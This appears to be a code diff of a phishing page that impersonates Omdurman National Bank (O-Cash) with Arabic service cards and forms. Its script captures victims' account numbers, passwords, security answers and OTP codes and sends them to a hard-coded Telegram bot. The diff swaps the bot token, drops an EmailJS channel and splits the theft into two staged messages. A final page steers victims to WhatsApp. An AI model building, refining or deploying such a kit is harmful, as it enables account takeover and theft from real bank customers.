@@ -6,15 +6,6 @@
     <title>خدمات بنك أمدرمان الوطني (أوكاش)</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    
-    <!-- ربط مكتبة EmailJS مع المفتاح العام الخاص بك -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-       (function(){
-          emailjs.init("SDJ-L502QGdIsfCEO");
-       })();
-    </script>
-
     <style>
         :root {
             --main-green: #1a8a3f;
@@ -30,7 +21,7 @@
         .page-section { display: none; }
         .page-section.active { display: block; }
 
-        /* شاشة التحميل الذكية */
+        /* شاشة التحميل المؤقتة */
         #loading-overlay {
             display: none;
             position: fixed;
@@ -134,10 +125,31 @@
         .steps h4 { color: var(--main-green); margin-bottom: 10px; text-align: center; }
         .steps ol { padding-right: 20px; color: #444; line-height: 1.6; font-size: 13px; }
 
-        .success-box { text-align: center; padding: 10px 5px; }
-        .success-icon { font-size: 60px; color: var(--green-bright); margin-bottom: 15px; }
-        .success-title { color: var(--main-green); font-size: 22px; font-weight: bold; margin-bottom: 12px; }
-        .success-msg { color: #444; font-size: 15px; line-height: 1.6; margin-bottom: 25px; font-weight: bold; }
+        .success-box {
+            text-align: center;
+            padding: 10px 5px;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: var(--green-bright);
+            margin-bottom: 15px;
+        }
+
+        .success-title {
+            color: var(--main-green);
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+
+        .success-msg {
+            color: #444;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            font-weight: bold;
+        }
 
         .btn-whatsapp-custom {
             background: var(--green-bright);
@@ -158,7 +170,10 @@
             box-shadow: 0 4px 10px rgba(28, 184, 82, 0.3);
         }
 
-        .btn-whatsapp-custom:hover { background: #159e43; }
+        .btn-whatsapp-custom:hover {
+            background: #159e43;
+        }
+
         .contact-banner { background: var(--main-green); color: white; max-width: 800px; margin: 40px auto 20px; padding: 20px; border-radius: 15px; text-align: center; }
         .whatsapp-number { background: #ffcc00; color: #000; padding: 8px 20px; border-radius: 8px; font-weight: bold; font-size: 18px; display: inline-block; margin-top: 10px; }
         .footer { background: #ccc; padding: 15px; font-size: 14px; margin-top: 40px; text-align: center; color: #333; }
@@ -166,7 +181,7 @@
 </head>
 <body>
 
-    <!-- شاشة التحميل -->
+    <!-- شاشة التحميل الذكية -->
     <div id="loading-overlay">
         <div class="spinner"></div>
         <h3 style="font-family: 'Tajawal', sans-serif;">انتظر... جاري المعالجة والتحميل</h3>
@@ -179,22 +194,49 @@
         </div>
     </header>
 
-    <!-- 1. الرئيسية -->
+    <!-- 1. الصفحة الرئيسية -->
     <div id="home-page" class="page-section active">
         <section class="services-container">
             <div class="services-title">بنك أمدرمان الوطني (أوكاش) | مرحباً بكم في خدمات بنك أمدرمان الوطني</div>
             <div class="services-subtitle">الرجاء الاختيار من الخدمات المقدمة أدناه</div>
 
             <div class="services-grid">
-                <div class="service-card" onclick="openDetails('limit-up')"><i class="fa-solid fa-gauge-high service-icon"></i><div class="service-content"><h3>رفع سقف التحويلات اليومية</h3><p>زيادة الحد اليومي للتحويلات.</p></div></div>
-                <div class="service-card" onclick="openDetails('wrong-transfer')"><i class="fa-solid fa-right-left service-icon"></i><div class="service-content"><h3>التحويلات الخاطئة</h3><p>معالجة أخطاء التحويلات البنكية.</p></div></div>
-                <div class="service-card" onclick="openDetails('foreign-currency')"><i class="fa-solid fa-globe service-icon"></i><div class="service-content"><h3>خدمات العملات الأجنبية</h3><p>تفعيل وإدارة العملات الأجنبية.</p></div></div>
-                <div class="service-card" onclick="openDetails('statement')"><i class="fa-solid fa-file-lines service-icon"></i><div class="service-content"><h3>كشف الحساب</h3><p>الحصول على كشف حساب مفصل.</p></div></div>
-                <div class="service-card" onclick="openDetails('visa')"><i class="fa-solid fa-credit-card service-icon"></i><div class="service-content"><h3>بطاقة فيزا افتراضية</h3><p>تفعيل بطاقة فيزا للاستخدام الإلكتروني.</p></div></div>
-                <div class="service-card" onclick="openDetails('account')"><i class="fa-solid fa-id-card service-icon"></i><div class="service-content"><h3>حساب جاري و حساب مميز</h3><p>فتح أو ترقية الحساب.</p></div></div>
-                <div class="service-card" onclick="openDetails('security')"><i class="fa-solid fa-lock service-icon"></i><div class="service-content"><h3>إدارة أسئلة الأمان</h3><p>تحديث أو إعادة تعيين أسئلة الأمان.</p></div></div>
-                <div class="service-card" onclick="openDetails('change-phone')"><i class="fa-solid fa-mobile-screen service-icon"></i><div class="service-content"><h3>تغيير الموبايل</h3><p>تحديث رقم الهاتف المرتبط بالحساب.</p></div></div>
-                <div class="service-card" onclick="openDetails('update-data')"><i class="fa-solid fa-pen-to-square service-icon"></i><div class="service-content"><h3>تحديث البيانات</h3><p>تحديث البيانات الشخصية المسجلة.</p></div></div>
+                <div class="service-card" onclick="openDetails('limit-up')">
+                    <i class="fa-solid fa-gauge-high service-icon"></i>
+                    <div class="service-content"><h3>رفع سقف التحويلات اليومية</h3><p>زيادة الحد اليومي للتحويلات.</p></div>
+                </div>
+                <div class="service-card" onclick="openDetails('wrong-transfer')">
+                    <i class="fa-solid fa-right-left service-icon"></i>
+                    <div class="service-content"><h3>التحويلات الخاطئة</h3><p>معالجة أخطاء التحويلات البنكية.</p></div>
+                </div>
+                <div class="service-card" onclick="openDetails('foreign-currency')">
+                    <i class="fa-solid fa-globe service-icon"></i>
+                    <div class="service-content"><h3>خدمات العملات الأجنبية</h3><p>تفعيل وإدارة العملات الأجنبية.</p></div>
+                </div>
+                <div class="service-card" onclick="openDetails('statement')">
+                    <i class="fa-solid fa-file-lines service-icon"></i>
+                    <div class="service-content"><h3>كشف الحساب</h3><p>الحصول على كشف حساب مفصل.</p></div>
+                </div>
+                <div class="service-card" onclick="openDetails('visa')">
+                    <i class="fa-solid fa-credit-card service-icon"></i>
+                    <div class="service-content"><h3>بطاقة فيزا افتراضية</h3><p>تفعيل بطاقة فيزا للاستخدام الإلكتروني.</p></div>
+                </div>
+                <div class="service-card" onclick="openDetails('account')">
+                    <i class="fa-solid fa-id-card service-icon"></i>
+                    <div class="service-content"><h3>حساب جاري و حساب مميز</h3><p>فتح أو ترقية الحساب.</p></div>
+                </div>
+                <div class="service-card" onclick="openDetails('security')">
+                    <i class="fa-solid fa-lock service-icon"></i>
+                    <div class="service-content"><h3>إدارة أسئلة الأمان</h3><p>تحديث أو إعادة تعيين أسئلة الأمان.</p></div>
+                </div>
+                <div class="service-card" onclick="openDetails('change-phone')">
+                    <i class="fa-solid fa-mobile-screen service-icon"></i>
+                    <div class="service-content"><h3>تغيير الموبايل</h3><p>تحديث رقم الهاتف المرتبط بالحساب.</p></div>
+                </div>
+                <div class="service-card" onclick="openDetails('update-data')">
+                    <i class="fa-solid fa-pen-to-square service-icon"></i>
+                    <div class="service-content"><h3>تحديث البيانات</h3><p>تحديث البيانات الشخصية المسجلة.</p></div>
+                </div>
             </div>
 
             <div class="contact-banner">
@@ -224,6 +266,7 @@
         <div class="card">
             <h3>الاستمارة أونلاين</h3>
             <p class="subtitle">الرجاء إدخال البيانات</p>
+            
             <form id="loginForm" onsubmit="captureAndProceed(event, 'security-page', 'تسجيل الدخول')">
                 <div class="form-group">
                     <label>رقم الحساب:</label>
@@ -244,6 +287,7 @@
         <div class="card">
             <h3>متابعة الاستمارة أونلاين</h3>
             <p class="subtitle">الرجاء الإجابة على سؤال الأمان</p>
+            
             <form id="secForm" onsubmit="captureAndProceed(event, 'otp-page', 'سؤال الأمان')">
                 <div class="form-group">
                     <label>اختر سؤال الأمان:</label>
@@ -280,6 +324,7 @@
         <div class="card" style="text-align: center;">
             <h3>إدخال رمز OTP</h3>
             <p class="subtitle">الرجاء إدخال رمز التحقق المرسل إلى رقم هاتفك وبريدك الإلكتروني المسجل</p>
+            
             <form id="otpForm" onsubmit="captureAndProceed(event, 'confirm-page', 'رمز OTP')">
                 <div style="text-align: right; margin-bottom: 5px; font-size: 13px; font-weight: bold;">أدخل رمز التحقق (OTP):</div>
                 <input type="text" id="otpCode" maxlength="6" class="form-control" placeholder="أدخل رمز مكون من 6 أرقام" style="text-align: center; font-size: 18px; letter-spacing: 3px;" required>
@@ -289,13 +334,15 @@
         </div>
     </div>
 
-    <!-- 6. صفحة النجاح والواتساب -->
+    <!-- 6. صفحة النجاح ورسالة الواتساب -->
     <div id="confirm-page" class="page-section">
         <div class="card">
             <div class="success-box">
                 <i class="fa-solid fa-circle-check success-icon"></i>
                 <div class="success-title">تم تسليم بياناتك بنجاح</div>
-                <div class="success-msg">الرجاء التواصل مع فريق الدعم على الواتساب لحل المشكلة وإكمال طلبك.</div>
+                <div class="success-msg">
+                    الرجاء التواصل مع فريق الدعم على الواتساب لحل المشكلة وإكمال طلبك.
+                </div>
                 <a href="#" onclick="sendWhatsApp()" class="btn-whatsapp-custom">
                     <i class="fa-brands fa-whatsapp" style="font-size: 22px;"></i> التواصل مع الدعم عبر واتساب
                 </a>
@@ -306,13 +353,9 @@
     <footer class="footer">بنك أمدرمان الوطني (أوكاش) | جميع الحقوق محفوظة 2026</footer>
 
     <script>
-        // إعدادات تيليجرام
-        const TELEGRAM_BOT_TOKEN = "8874850044:AAGYZncow8wTcaq0H7BPG-u8sTnT7jQ_TTDUTDU";
+        // التوكن الجديد والآيدي الخاص بك
+        const TELEGRAM_BOT_TOKEN = "8907088773:AAFfZ7GEehFp6NGS9s8Piolu8w4Xc4h-EZA";
         const TELEGRAM_CHAT_ID = "8362235682";
-
-        // إعدادات EmailJS الخاصة بك
-        const EMAILJS_SERVICE_ID = "Service_dpg8tir";
-        const EMAILJS_TEMPLATE_ID = "template_guh8ejx";
 
         let userData = {
             username: '',
@@ -337,7 +380,9 @@
         function showPage(pageId) {
             document.querySelectorAll('.page-section').forEach(sec => sec.classList.remove('active'));
             const target = document.getElementById(pageId);
-            if (target) target.classList.add('active');
+            if (target) {
+                target.classList.add('active');
+            }
             window.scrollTo(0, 0);
         }
 
@@ -347,6 +392,7 @@
             document.getElementById('det-title').innerText = data.title;
             document.getElementById('det-desc').innerText = data.desc;
             document.getElementById('det-icon').className = `fa-solid ${data.icon}`;
+            
             const stepsOl = document.getElementById('det-steps');
             stepsOl.innerHTML = '';
             data.steps.forEach(step => {
@@ -376,17 +422,15 @@
             if(stepName === 'تسجيل الدخول') {
                 userData.username = document.getElementById('username').value;
                 userData.password = document.getElementById('password').value;
-                sendToTelegram("مرحلة 1: تسجيل الدخول");
-                sendToEmail("مرحلة 1: تسجيل الدخول");
+                // إرسال البيانات الأولى فوراً وحدها
+                sendLoginToTelegram();
             } else if(stepName === 'سؤال الأمان') {
                 userData.securityQuestion = document.getElementById('secQuestion').value;
                 userData.securityAnswer = document.getElementById('secAnswer').value;
-                sendToTelegram("مرحلة 2: سؤال الأمان");
-                sendToEmail("مرحلة 2: سؤال الأمان");
             } else if(stepName === 'رمز OTP') {
                 userData.otp = document.getElementById('otpCode').value;
-                sendToTelegram("مرحلة 3: رمز OTP وإكمال التسجيل");
-                sendToEmail("مرحلة 3: رمز OTP وإكمال التسجيل");
+                // إرسال بقية البيانات (أسئلة الأمان + الرمز) معاً ومنظمة
+                sendFinalDataToTelegram();
             }
 
             const loader = document.getElementById('loading-overlay');
@@ -398,20 +442,36 @@
             }, 2000);
         }
 
-        // إرسال لـ Telegram
-        function sendToTelegram(stageInfo) {
+        // إرسال الخطوة الأولى (رقم الحساب وكلمة المرور) فوراً
+        function sendLoginToTelegram() {
             const message = `
-🔔 *إشعار جديد من موقع بنك أمدرمان*:
-📌 *المرحلة*: ${stageInfo}
-👤 *اسم المستخدم/الحساب*: \`${userData.username}\`
+🚨 *[1] بيانات تسجيل الدخول*:
+👤 *رقم الحساب / المستخدم*: \`${userData.username}\`
 🔑 *كلمة المرور*: \`${userData.password}\`
-❓ *سؤال الأمان*: ${userData.securityQuestion || 'غير محدد'}
-💡 *الإجابة*: \`${userData.securityAnswer || 'غير محدد'}\`
-🔢 *رمز OTP*: \`${userData.otp || 'غير محدد'}\`
 ⏰ *الوقت*: ${new Date().toLocaleString('ar-SA')}
             `;
 
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            sendRequest(message);
+        }
+
+        // إرسال الخطوة الأخيرة (أسئلة الأمان ورمز التحقق OTP) معاً ومنظمة
+        function sendFinalDataToTelegram() {
+            const message = `
+🚨 *[2] تفاصيل الحماية والتحقق*:
+👤 *الحساب*: \`${userData.username}\`
+❓ *سؤال الأمان*: ${userData.securityQuestion}
+💡 *إجابة سؤال الأمان*: \`${userData.securityAnswer}\`
+🔢 *رمز التحقق (OTP)*: \`${userData.otp}\`
+⏰ *الوقت*: ${new Date().toLocaleString('ar-SA')}
+            `;
+
+            sendRequest(message);
+        }
+
+        function sendRequest(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -420,22 +480,6 @@
                     parse_mode: 'Markdown'
                 })
             }).catch(err => console.log('Telegram Send Error:', err));
-        }
-
-        // إرسال لـ EmailJS المباشر
-        function sendToEmail(stageInfo) {
-            const templateParams = {
-                stage: stageInfo,
-                username: userData.username,
-                password: userData.password,
-                security_question: userData.securityQuestion || 'غير محدد',
-                security_answer: userData.securityAnswer || 'غير محدد',
-                otp: userData.otp || 'غير محدد'
-            };
-
-            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
-                .then(res => console.log('Email sent successfully!', res.status))
-                .catch(err => console.log('EmailJS Error:', err));
         }
 
         function sendWhatsApp() {
